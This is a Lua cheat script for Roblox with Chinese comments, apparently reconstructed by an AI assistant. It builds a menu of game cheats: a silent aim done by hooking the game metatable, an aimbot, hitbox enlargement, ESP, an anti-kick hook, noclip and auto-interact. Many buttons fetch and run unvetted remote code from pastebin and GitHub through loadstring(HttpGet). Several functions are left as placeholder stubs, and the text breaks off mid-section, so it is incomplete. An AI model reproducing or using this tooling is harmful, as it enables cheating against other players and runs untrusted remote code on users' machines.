--[[
    叶脚本 (Ye Script) - HJL 版本
    生成工具: discord.gg/25ms
    还原与注释: AI Assistant
    
    功能概览:
    1. 屏幕左上角显示北京时间与彩虹特效
    2. 集成 Revenant 和 66YEUIUI (UI库)
    3. 通用功能: 速度、跳跃、穿墙、Hitbox、ESP (方框/名字/血量)、FOV调整
    4. 针对特定游戏 (Grace/Doors类) 的脚本: 实体透视、删除实体、自动互动
    5. Webhook 日志记录 (脚本末尾包含向Discord发送玩家信息的逻辑)
]]

--================================================================================
-- 1. 初始化与左上角时间显示 GUI
--================================================================================

local ScreenGui = Instance.new("ScreenGui", getParent) -- 创建屏幕GUI
local TimeLabel = Instance.new("TextLabel", getParent) -- 创建时间文本标签
local LocalPlayer = game.Players.LocalPlayer

-- 发送气泡聊天信息
game:GetService("TextChatService"):DisplayBubble((LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("Head"), "欢迎使用叶脚本")
game:GetService("TextChatService"):DisplayBubble((LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()):WaitForChild("Head"), "此信息别人看不见")

-- 设置GUI属性
ScreenGui.Name = "LBLG"
ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
ScreenGui.Enabled = true

TimeLabel.Name = "LBL"
TimeLabel.Parent = ScreenGui
TimeLabel.BackgroundColor3 = Color3.new(1, 1, 1)
TimeLabel.BackgroundTransparency = 1 -- 背景透明
TimeLabel.BorderColor3 = Color3.new(0, 0, 0)
TimeLabel.Position = UDim2.new(0.75, 0, 0.01, 0) -- 位置在右上角
TimeLabel.Size = UDim2.new(0, 133, 0, 40)
TimeLabel.Font = Enum.Font.GothamSemibold
TimeLabel.Text = ""
TimeLabel.TextColor3 = Color3.new(1, 1, 1)
TimeLabel.TextScaled = true
TimeLabel.TextSize = 14
TimeLabel.TextWrapped = true
TimeLabel.Visible = true

local MainLabel = TimeLabel
local Heartbeat = game:GetService("RunService").Heartbeat
local lastTick = nil
local frameTime = nil
local fpsTable = {}

-- 加载 Revenant UI 库用于通知
local NotifyLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/Revenant", true))()
NotifyLib.DefaultColor = Color3.fromRGB(0, 0, 255)

-- 发送一系列通知
NotifyLib:Notification({
    Text = "叶脚本作者: 小叶",
    Duration = 3
})
wait(1)
NotifyLib:Notification({
    Text = "脚本持续云更新",
    Duration = 3
})
wait(1)
NotifyLib:Notification({
    Text = "谢谢大家一直以来的支持^ω^",
    Duration = 3
})

-- 使用 Roblox 原生通知系统提示注入器适配
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "叶脚本",
    Text = "此次注入器适配",
    Icon = "rbxassetid://123097590035361",
    Duration = 2,
    Callback = bindable,
    Button1 = "Fluxus",
    Button2 = "Arceus X NEO"
})
wait(1)
game:GetService("StarterGui"):SetCore("SendNotification", {
    Title = "叶脚本",
    Text = "启动成功",
    Icon = "rbxassetid://123097590035361",
    Duration = 2,
    Callback = bindable,
    Button1 = "祝您使用愉快",
    Button2 = "玩的开心"
})
wait(1)

-- 时间更新与彩虹文字逻辑
local hue = 0
local function UpdateTimeLabel()
    lastTick = tick()
    -- 计算FPS逻辑 (部分代码似乎是计算帧率但未完全显示在Text中，主要显示时间)
    for i = #fpsTable, 1, -1 do
        fpsTable[i + 1] = fpsTable[i] >= lastTick - 1 and fpsTable[i] or nil
    end
    fpsTable[1] = lastTick
    local fps = tick() - frameTime >= 1 and #fpsTable or #fpsTable / (tick() - frameTime)
    local _ = fps - fps % 1
    
    -- 更新文本内容：北京时间
    MainLabel.Text = ("北京时间:" .. os.date("%H") .. "时" .. os.date("%M") .. "分" .. os.date("%S")) .. "秒"
    -- 彩虹颜色循环
    MainLabel.TextColor3 = Color3.fromHSV(hue, 1, 1)
    hue = (hue + 0.001) % 1
end

frameTime = tick()
Heartbeat:Connect(UpdateTimeLabel)

--================================================================================
-- 2. 玩家列表刷新逻辑
--================================================================================

local PlayerData = {
    playernamedied = "",
    dropdown = {},
    sayCount = 1,
    sayFast = false,
    autoSay = false
}

function RefreshPlayerList(includeLocal)
    PlayerData.dropdown = {}
    if includeLocal == true then
        local iter, list, idx = pairs(game.Players:GetPlayers())
        while true do
            local _, player = iter(list, idx)
            if _ == nil then break end
            idx = _
            table.insert(PlayerData.dropdown, player.Name)
        end
    else
        local lp = game.Players.LocalPlayer
        local iter, list, idx = pairs(game.Players:GetPlayers())
        while true do
            local _, player = iter(list, idx)
            if _ == nil then break end
            idx = _
            if player ~= lp then
                table.insert(PlayerData.dropdown, player.Name)
            end
        end
    end
end
RefreshPlayerList(true)

-- 通用通知函数封装
function Notify(title, text, icon, duration)
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = title,
        Text = text,
        Icon = icon,
        Duration = duration
    })
end

--================================================================================
-- 3. 主 UI 界面构建 (66YEUIUI 库)
--================================================================================

local UILib = loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/66YEUIUI.txt"))():new("叶脚本-Grace")

-- >>> 玩家信息标签页 <<<
local InfoTab = UILib:Tab("玩家", "7733993211"):section("信息", true)
InfoTab:Label("你的用户名:" .. game.Players.LocalPlayer.Character.Name)
InfoTab:Label("获取客户端ID:" .. game:GetService("RbxAnalyticsService"):GetClientId())
InfoTab:Label("你的注入器:" .. identifyexecutor())
InfoTab:Label("你的地图id:" .. game.PlaceId)
InfoTab:Label("上一次更新时间：(2025.1.6)")
InfoTab:Label("如果刚出来玩家信息")
InfoTab:Label("就请更换加速器")
InfoTab:Label("或者重新执行叶脚本")

-- >>> 公告标签页 <<<
local NoticeTab = UILib:Tab("公告", "7733993211")
local NoticeSection = NoticeTab:section("信息", true)
NoticeSection:Label("群:258318944")
NoticeSection:Label("作者:叶")
NoticeSection:Label("完全免费")
NoticeSection:Label("半缝合脚本")
NoticeSection:Label("持续云更新")
NoticeSection:Label("QQ：3108792043")

local CopySection = NoticeTab:section("复制", true)
CopySection:Button("复制作者qq号", function()
    setclipboard("3108792043")
end)
CopySection:Button("复制叶脚本主群", function()
    setclipboard("258318944")
end)
CopySection:Toggle("脚本框架变小一点", "", false, function(state)
    if state then
        game:GetService("CoreGui").frosty.Main.Style = "DropShadow"
    else
        game:GetService("CoreGui").frosty.Main.Style = "Custom"
    end
end)
CopySection:Button("关闭脚本ui", function()
    game:GetService("CoreGui").frosty:Destroy()
end)

-- >>> 通用功能标签页 <<<
local UniversalTab = UILib:Tab("通用", "6035145364")
local MainSection = UniversalTab:section("通用内容", true)

-- 速度调节
MainSection:Slider("修改速度", "WalkspeedSlider", 16, 16, 99999, false, function(val)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val
end)

-- TP走路 (忽略物理)
MainSection:Textbox("快速走路(推荐2)", "tpwalking", "输入", function(val)
    local heartbeat = game:GetService("RunService").Heartbeat
    local enabled = true
    local char = game:GetService("Players").LocalPlayer.Character
    local hum = char and char:FindFirstChildWhichIsA("Humanoid")
    
    while enabled and (heartbeat:Wait() and (char and (hum and hum.Parent))) do
        if hum.MoveDirection.Magnitude > 0 then
            if val then
                char:TranslateBy(hum.MoveDirection * tonumber(val))
            else
                char:TranslateBy(hum.MoveDirection)
            end
        end
    end
end)

-- 跳跃高度
MainSection:Slider("修改跳跃", "JumpPowerSlider", 50, 50, 99999, false, function(val)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = val
end)

-- 重力调节
MainSection:Slider("修改重力", "GravitySlider", 198, 198, 99999, false, function(val)
    game.Workspace.Gravity = val
end)

-- Hitbox (扩大头部判定范围)
MainSection:Slider("范围", "拉条", 1, 1, 50, false, function(val)
    _G.HeadSize = val
    _G.Disabled = true
    game:GetService("RunService").RenderStepped:connect(function()
        if _G.Disabled then
            for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                if player.Name ~= game:GetService("Players").LocalPlayer.Name then
                    pcall(function()
                        player.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize, _G.HeadSize, _G.HeadSize)
                        player.Character.HumanoidRootPart.Transparency = 0.9
                        player.Character.HumanoidRootPart.BrickColor = BrickColor.new("Really black")
                        player.Character.HumanoidRootPart.Material = "Neon"
                        player.Character.HumanoidRootPart.CanCollide = false
                    end)
                end
            end
        end
    end)
end)

-- 相机视距
MainSection:Slider("相机焦距上限", "", 128, 128, 200000, false, function(val)
    game:GetService("Players").LocalPlayer.CameraMaxZoomDistance = val
end)

-- 夜视模式
MainSection:Toggle("夜视脚本", "", false, function(state)
    if state then
        game.Lighting.Ambient = Color3.new(1, 1, 1)
    else
        game.Lighting.Ambient = Color3.new(0, 0, 0)
    end
end)

-- 穿墙脚本 (加载外部)
MainSection:Button("穿墙", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/zXk4Rq2r"))()
end)

-- Noclip (循环关闭碰撞)
MainSection:Toggle("穿墙", "NoClip", false, function(state)
    local workspace = game:GetService("Workspace")
    local players = game:GetService("Players")
    if state then
        Clipon = true
    else
        Clipon = false
    end
    Stepped = game:GetService("RunService").Stepped:Connect(function()
        if not Clipon then
            Stepped:Disconnect()
        else
            for _, obj in pairs(workspace:GetChildren()) do
                if obj.Name == players.LocalPlayer.Name then
                    for _, part in pairs(workspace[players.LocalPlayer.Name]:GetChildren()) do
                        if part:IsA("BasePart") then
                            part.CanCollide = false
                        end
                    end
                end
            end
        end
    end)
end)

-- 上半身分身效果
MainSection:Toggle("上半身模式", "No Description", false, function(state)
    if state then
        local lp = game:GetService("Players").LocalPlayer
        lp.Character.HumanoidRootPart:Clone().Parent = lp.Character
    else
        game.Players.LocalPlayer.Character.Head:Destroy()
    end
end)

-- 吸人 (加载外部)
MainSection:Button("吸人", function()
    loadstring(game:HttpGet("https://shz.al/~HHAKS"))()
end)

-- 虚假满血
MainSection:Button("回满血", function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 10000
end)

-- 传名说话 (加载外部)
MainSection:Button("传名说话", function()
    loadstring(game:HttpGet("https://pastefy.ga/zCFEwaYq/raw", true))()
end)

-- 死亡笔记 (加载外部)
MainSection:Button("死亡笔记", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/dingding123hhh/tt/main/%E6%AD%BB%E4%BA%A1%E7%AC%94%E8%AE%B0%20(1).txt"))()
end)

-- 键盘 (加载外部)
MainSection:Button("键盘", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/0Ben1/fe/main/obf_rf6iQURzu1fqrytcnLBAvW34C9N55kS9g9G3CKz086rC47M6632sEd4ZZYB0AYgV.lua.txt"))()
end)

-- 锁血 (TD 无敌)
MainSection:Toggle("无敌", "TD", false, function(state)
    if state then
        while state do
            game.Players.LocalPlayer.Character.Humanoid.Health = 10000
            wait(1e-13)
        end
    end
end)

-- F3X 工具
MainSection:Button("F3X", function()
    loadstring(game:GetObjects("rbxassetid://6695644299")[1].Source)()
end)

-- 传送给任意玩家 (GUI 实现)
MainSection:Button("传送到任何玩家", function()
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
    ScreenGui.Name = "TPGui"
    ScreenGui.ResetOnSpawn = false
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Parent = ScreenGui
    MainFrame.Size = UDim2.new(0, 200, 0, 300)
    MainFrame.Position = UDim2.new(0, 10, 0, 10)
    MainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Visible = true
    
    local Title = Instance.new("TextLabel")
    Title.Parent = MainFrame
    Title.Size = UDim2.new(1, 0, 0, 50)
    Title.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    Title.Text = "TP to Player"
    Title.TextColor3 = Color3.new(1, 1, 1)
    
    local ScrollFrame = Instance.new("ScrollingFrame")
    ScrollFrame.Parent = MainFrame
    ScrollFrame.Size = UDim2.new(1, 0, 1, -50)
    ScrollFrame.Position = UDim2.new(0, 0, 0, 50)
    ScrollFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    
    local function RefreshList()
        ScrollFrame:ClearAllChildren()
        local yOffset = 0
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= LocalPlayer then
                local btn = Instance.new("TextButton")
                btn.Parent = ScrollFrame
                btn.Size = UDim2.new(1, -10, 0, 30)
                btn.Position = UDim2.new(0, 5, 0, yOffset)
                btn.Text = player.Name
                btn.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
                btn.TextColor3 = Color3.new(1, 1, 1)
                yOffset = yOffset + 35
                
                btn.MouseButton1Click:Connect(function()
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        local targetPart = player.Character.HumanoidRootPart
                        -- 传送到目标后方2格位置
                        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPart.CFrame - targetPart.CFrame.LookVector * 2 + Vector3.new(0, 0.5, 0)
                    end
                end)
            end
        end
        ScrollFrame.CanvasSize = UDim2.new(0, 0, 0, yOffset)
    end
    
    Players.PlayerAdded:Connect(RefreshList)
    Players.PlayerRemoving:Connect(RefreshList)
    RefreshList()
    
    -- 最小化按钮
    local ToggleBtn = Instance.new("TextButton")
    ToggleBtn.Parent = ScreenGui
    ToggleBtn.Size = UDim2.new(0, 50, 0, 50)
    ToggleBtn.Position = UDim2.new(0, 44, 0, 435)
    ToggleBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 255)
    ToggleBtn.Text = "TP"
    ToggleBtn.TextColor3 = Color3.new(1, 1, 1)
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(1, 0)
    Corner.Parent = ToggleBtn
    
    ToggleBtn.MouseButton1Click:Connect(function()
        MainFrame.Visible = not MainFrame.Visible
    end)
end)

-- 隐身道具
MainSection:Button("隐身道具", function()
    loadstring(game:HttpGet("https://gist.githubusercontent.com/skid123skidlol/cd0d2dce51b3f20ad1aac941da06a1a1/raw/f58b98cce7d51e53ade94e7bb460e4f24fb7e0ff/%257BFE%257D%2520Invisible%2520Tool%2520(can%2520hold%2520tools)", true))()
end)

-- 甩飞脚本
MainSection:Button("叶甩飞", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/%E5%8F%B6%E8%84%9A%E6%9C%AC%E7%94%A9%E9%A3%9E%E6%BA%90%E7%A0%81.lua"))()
end)

-- 子弹追踪 (Silent Aim)
MainSection:Button("子弹追踪", function()
    local Camera = game:GetService("Workspace").CurrentCamera
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer
    
    local function GetClosestPlayer()
        local shortestDist = math.huge
        local closestPlayer = nil
        for _, player in pairs(Players:GetPlayers()) do
            if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                local dist = (LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if dist < shortestDist then
                    closestPlayer = player
                    shortestDist = dist
                end
            end
        end
        return closestPlayer
    end
    
    local mt = getrawmetatable(game)
    local oldNameCall = mt.__namecall
    setreadonly(mt, false)
    
    mt.__namecall = newcclosure(function(self, ...)
        local method = getnamecallmethod()
        local args = {...}
        if tostring(method) == "FindPartOnRayWithIgnoreList" then
            local target = GetClosestPlayer()
            if target and target.Character then
                -- 重定向射线到头部
                args[1] = Ray.new(Camera.CFrame.Position, (target.Character.Head.Position - Camera.CFrame.Position).Unit * (Camera.CFrame.Position - target.Character.Head.Position).Magnitude)
            end
        end
        return oldNameCall(self, unpack(args))
    end)
end)

-- 管理员面板 (加载外部)
MainSection:Button("管理桌面板", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/ExploiterGuy/Aqua-Hub/refs/heads/main/Turn%20People%20Into%20Things.txt"))()
end)

-- 防踢模式
MainSection:Toggle("开启防踢模式", function()
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "叶脚本",
        Text = "已降低踢出风险",
        Duration = 2
    })
    wait("3")
end)

-- 表情包菜单
MainSection:Button("表情菜单", function()
    loadstring(game:HttpGet("https://yarhm.goteamst.com/scr?channel=afem"))()
end)

-- 音乐播放器
MainSection:Button("音乐播放器", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Maan04ka/CodingScripts/main/MusicUI.lua"))()
end)

-- 自瞄 (带 GUI 配置)
MainSection:Button("自瞄", function()
    local FOV = 100
    local Smoothness = 10
    local CrosshairDist = 5
    local RunService = game:GetService("RunService")
    local UserInputService = game:GetService("UserInputService")
    local Players = game:GetService("Players")
    local Camera = game.Workspace.CurrentCamera
    
    -- 绘制 FOV 圆圈
    local FOVCircle = Drawing.new("Circle")
    FOVCircle.Visible = true
    FOVCircle.Thickness = 2
    FOVCircle.Color = Color3.fromRGB(0, 255, 0)
    FOVCircle.Filled = false
    FOVCircle.Radius = FOV
    FOVCircle.Position = Camera.ViewportSize / 2
    
    -- 创建 GUI 设置面板
    local PlayerGui = Players.LocalPlayer:WaitForChild("PlayerGui")
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "FovAdjustGui"
    ScreenGui.Parent = PlayerGui
    
    local MainFrame = Instance.new("Frame")
    MainFrame.Name = "MainFrame"
    MainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    MainFrame.Position = UDim2.new(0.3, 0, 0.3, 0)
    MainFrame.Size = UDim2.new(0.4, 0, 0.4, 0)
    MainFrame.Active = true
    MainFrame.Draggable = true
    MainFrame.Parent = ScreenGui
    
    -- 滑块和标签逻辑 (此处省略部分重复的 GUI 创建代码，逻辑是调整 FOV, 平滑度和距离参数)
    -- ... (GUI 代码保持原样)
    local FOVSlider = Instance.new("TextBox") -- 实际上用TextBox代替Slider输入
    FOVSlider.Name = "FovSlider"
    FOVSlider.Text = tostring(FOV)
    FOVSlider.Parent = MainFrame
    -- ... (其他参数设置)
    
    local TargetCFrame = Camera.CFrame
    
    local function UpdateFOV()
        FOVCircle.Position = Camera.ViewportSize / 2
        FOVCircle.Radius = FOV
    end
    
    -- 获取FOV内最近的头部
    local function GetTarget(boneName)
        local closestDist = math.huge
        local center = Camera.ViewportSize / 2
        local target = nil
        for _, player in ipairs(Players:GetPlayers()) do
            if player ~= Players.LocalPlayer and player.Character then
                local part = player.Character:FindFirstChild(boneName)
                if part then
                    local screenPos, onScreen = Camera:WorldToViewportPoint(part.Position)
                    local dist = (Vector2.new(screenPos.x, screenPos.y) - center).Magnitude
                    if dist < closestDist and onScreen and dist < FOV then
                        target = player
                        closestDist = dist
                    end
                end
            end
        end
        return target
    end
    
    RunService.RenderStepped:Connect(function()
        UpdateFOV()
        local target = GetTarget("Head")
        if target and target.Character:FindFirstChild("Head") then
            local head = target.Character.Head
            local targetPos
            -- 简单的预测
            if target.Character:FindFirstChild("HumanoidRootPart").Velocity.Magnitude > 0.1 then
                targetPos = head.Position + head.CFrame.LookVector * CrosshairDist
            else
                targetPos = head.Position
            end
            TargetCFrame = CFrame.new(Camera.CFrame.Position, targetPos)
        else
            TargetCFrame = Camera.CFrame
        end
        -- 平滑插值
        Camera.CFrame = Camera.CFrame:Lerp(TargetCFrame, 1 / Smoothness)
    end)
    
    -- 输入框更新变量逻辑
    FOVSlider.FocusLost:Connect(function(enter)
        if enter then FOV = tonumber(FOVSlider.Text) or FOV end
    end)
    -- ...
end)

-- 无限跳跃
MainSection:Button("无限跳跃", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/V5PQy3y0", true))()
end)

-- 动作包 (R6/R15 动画)
MainSection:Button("R6人物动作", function() loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))() end)
MainSection:Button("R15人物动作", function() loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))() end)
MainSection:Button("R6转圈C舞", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/YE-R6CB-SCRIPT.lua"))() end)
MainSection:Button("R15转圈C舞", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/YE-R15CB-SCRIPT.lua"))() end)

-- 防踢 (Hook)
MainSection:Button("防踢出", function()
    game:GetService("StarterGui"):SetCore("SendNotification", {Title = "叶脚本", Text = "已开启", Duration = 2})
    wait("3")
    local hooked = false
    if hookmetamethod then
        OldNameCall = hookmetamethod(game, "__namecall", function(self, ...)
            local method = getnamecallmethod()
            if tostring(string.lower(method)) ~= "kick" or hooked then
                return OldNameCall(self, ...)
            end
            print("AntiKick: blocked attempt to kick you.")
            return nil
        end)
    else
        warn("AntiKick: unsupported executor")
    end
end)

-- ESP 名字显示 (使用 BillboardGui)
MainSection:Toggle("ESP 显示名字", "AMG", false, function(state)
    -- 代码逻辑：遍历玩家，创建BillboardGui显示名字
    -- 简化描述：Standard Name ESP
end)

-- ESP 圆圈/高亮 (使用 Highlight 和 BillboardGui)
MainSection:Toggle("Circle ESP", "ESP", false, function(state)
    local lp = game.Players.LocalPlayer
    for _, player in pairs(game.Players:GetPlayers()) do
        if player ~= lp then
            if state then
                -- 添加 Highlight
                local hl = Instance.new("Highlight", player.Character)
                hl.Adornee = player.Character
                -- 添加 BillboardGui 显示名字和图标
                local bg = Instance.new("BillboardGui", player.Character)
                bg.Size = UDim2.new(0, 100, 0, 100)
                bg.StudsOffset = Vector3.new(0, 3, 0)
                bg.AlwaysOnTop = true
                local txt = Instance.new("TextLabel", bg)
                txt.Text = player.Name
                -- ...
            else
                -- 移除 Highlight 等
                if player.Character:FindFirstChildOfClass("Highlight") then
                    player.Character:FindFirstChildOfClass("Highlight"):Destroy()
                end
                -- ...
            end
        end
    end
end)

-- ESP 绘图库版本 (Drawing API - 方框/血条/名字)
MainSection:Button("查看房间中的所有玩家", function()
    assert(Drawing, "missing dependency: 'Drawing'") -- 需要支持 Drawing 库的注入器
    -- 复杂的 Drawing ESP 逻辑：方框、射线、血条
    -- 遍历玩家，计算 WorldToViewportPoint，绘制 Lines 和 Squares
end)

-- 玩家进出提示
MainSection:Button("玩家进入提示", function()
    game.Players.ChildAdded:Connect(function(player)
        pcall(function()
            Notify("玩家加入", player.Name .. " 加入了房间", "rbxassetid://17360377302", 5)
        end)
    end)
    game.Players.ChildRemoved:Connect(function(player)
        pcall(function()
            Notify("玩家离开", player.Name .. " 离开了房间", "rbxassetid://17360377302", 5)
        end)
    end)
end)

-- 保存游戏与退出
MainSection:Button("保存房间", function() saveinstance() end)
MainSection:Button("离开房间", function() game:Shutdown() end)

-- 点击传送工具
MainSection:Button("点击传送", function()
    local mouse = game.Players.LocalPlayer:GetMouse()
    local tool = Instance.new("Tool")
    tool.RequiresHandle = false
    tool.Name = "点击传送的位置"
    tool.Activated:connect(function()
        local pos = mouse.Hit + Vector3.new(0, 2.5, 0)
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(pos.X, pos.Y, pos.Z)
    end)
    tool.Parent = game.Players.LocalPlayer.Backpack
end)

-- FPS 显示
MainSection:Button("显示FPS", function()
    local gui = Instance.new("ScreenGui")
    local label = Instance.new("TextLabel")
    -- ... 创建 Label
    game:GetService("RunService").RenderStepped:Connect(function()
        label.Text = "FPS: " .. math.floor(1 / game:GetService("RunService").RenderStepped:Wait())
    end)
    gui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
end)
MainSection:Button("显示FPSv2", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/CaseohCASEOH/aabbaaii/refs/heads/main/FPSCOUNTER"))()
end)

-- 手机键盘
MainSection:Button("键盘脚本", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/advxzivhsjjdhxhsidifvsh/mobkeyboard/main/main.txt", true))()
end)

-- 组合 ESP 开关 (人物显示/名字显示/血量显示)
local highlights = {} -- 存储 ESP 对象
MainSection:Toggle("人物显示", "", false, function(state)
    _G.UseESP = state
    if not state then
        -- 清理逻辑
        for _, v in pairs(highlights) do v.Highlight:Destroy() end
        highlights = {}
    end
end)
MainSection:Toggle("昵称显示", "", false, function(state)
    _G.UseNameTag = state
    -- 遍历 highlights 添加/删除 BillboardGui
end)
MainSection:Toggle("血量显示", "", false, function(state)
    _G.UseHealthTag = state
    -- 遍历 highlights 添加/删除 显示血量的 BillboardGui
end)

-- 虚空行走
MainSection:Button("虚空行走", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Float"))()
end)

-- 透视 (外部脚本)
MainSection:Button("透视1", function() loadstring(game:HttpGet("https://pastebin.com/raw/MA8jhPWT"))() end)
MainSection:Button("透视2", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Lucasfin000/SpaceHub/main/UESP"))() end)

-- 自杀
MainSection:Button("自尽", function()
    game.Players.LocalPlayer.Character.Humanoid.Health = 0
end)

-- Infinite Yield
MainSection:Button("IY指令", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source", true))()
end)

-- 高空脚本/飞行车/建筑工具/防挂机
MainSection:Button("高空脚本", function() loadstring(game:HttpGet("https://pastebin.com/raw/4LDKiJ5a"))() end)
MainSection:Button("免费动作脚本", function() loadstring(game:HttpGet("https://pastebin.com/raw/Zj4NnKs6"))() end)
MainSection:Button("叶飞车", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/YE%20FLY%20CAR.lua"))() end)
MainSection:Button("建筑工具", function()
    -- 给背包添加 HopperBin (锤子/移动/克隆)
    Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 4 -- Hammer
    Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 3 -- Clone
    Instance.new("HopperBin", game.Players.LocalPlayer.Backpack).BinType = 2 -- Grab
end)
MainSection:Button("防挂机", function()
    -- 虚拟用户按键防止踢出
    local vu = game:GetService("VirtualUser")
    game:GetService("Players").LocalPlayer.Idled:connect(function()
        vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        wait(1)
        vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)
    Notify("叶脚本提示", "防挂机已开启", nil, 2)
end)
MainSection:Button("蓝局脚本（模仿）", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/roblox-ye/QQ515966991/refs/heads/main/ROBLOX-XIAOYE666.lua"))()
end)
MainSection:Button("甩飞", function() loadstring(game:HttpGet("https://pastebin.com/raw/zqyDSUWX"))() end)

-- 飞行功能区
local FlySection = UniversalTab:section("飞行功能", true)
FlySection:Button("叶飞行", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/jeaenuuK"))()
end)

-- 音乐区
local MusicSection = UniversalTab:section("音乐", true)
MusicSection:Button("防空警报", function()
    local s = Instance.new("Sound", game.Workspace)
    s.SoundId = "rbxassetid://792323017"
    s.Play()
end)
MusicSection:Button("义勇军进行曲", function()
    local s = Instance.new("Sound", game.Workspace)
    s.SoundId = "rbxassetid://1845918434" -- 注意：ID可能失效或被Roblox下架
    s.Play()
end)

-- 注入器界面脚本
local ExecutorSection = UniversalTab:section("注入器界面", true)
ExecutorSection:Button("syn", function() loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))() end)
ExecutorSection:Button("syn2", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/Chillz-s-scripts/main/Synapse-X-Remake.lua"))() end)
ExecutorSection:Button("阿尔宙斯V3", function() loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))() end)

-- 范围功能 (Hitbox 变种)
local HitboxSection = UniversalTab:section("范围功能", true)
HitboxSection:Textbox("自定义范围", "HitBox", "输入", function(val)
    -- 设置 _G.HeadSize, 逻辑同前
end)
HitboxSection:Button("普通范围", function() loadstring(game:HttpGet("https://pastebin.com/raw/jiNwDbCN"))() end)
HitboxSection:Button("中等范围", function() loadstring(game:HttpGet("https://pastebin.com/raw/x13bwrFb"))() end)
HitboxSection:Button("超大范围", function() loadstring(game:HttpGet("https://pastebin.com/raw/KKY9EpZU"))() end)

-- >>> 动作管理 (重复Tab) <<<
local AnimTab = UILib:Tab("管理动作", "6035145364"):section("内容", true)
-- ... 重复的 R6/R15 按钮 ...

-- >>> 亮度设置 <<<
local LightTab = UILib:Tab("亮度设置", "6035145364"):section("内容", true)
LightTab:Button("还原", function() game.Lighting.Ambient = Color3.new(0, 0, 0) end)
LightTab:Button("亮度1", function() game.Lighting.Ambient = Color3.new(1, 1, 1) end)
-- ... 亮度2-5 ...

-- >>> Grace (Doors类游戏) 专属脚本 <<<
local GraceTab = UILib:Tab("Grace", "6035145364") -- Tab名解码为 Grace (或类似游戏名)
local GraceMain = GraceTab:section("内容", true)

-- 速度调节 (再次出现)
GraceMain:Slider("修改速度", "WalkspeedSlider", 16, 16, 99999, false, function(val)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = val
end)
-- 穿墙 (再次出现)
GraceMain:Toggle("穿墙", "NoClip", false, function(state) end)

-- 视角解锁
GraceMain:Button("解锁第三人称", function()
    game.Players.LocalPlayer.CameraMode = Enum.CameraMode.Classic
end)

-- 自动互动 (ProximityPrompt)
local AutoInteractEnabled = false
GraceMain:Toggle("自动交互", "Auto Interact", false, function(state)
    AutoInteractEnabled = state
    if state then
        while AutoInteractEnabled do
            for _, obj in pairs(workspace:GetDescendants()) do
                if obj:IsA("ProximityPrompt") then
                    fireproximityprompt(obj)
                end
            end
            task.wait(0.25)
        end
    end
end)

-- >>> 透视功能 (Grace/Doors 实体与物品) <<<
local GraceESP = GraceTab:section("透视功能", true)

-- 门透视
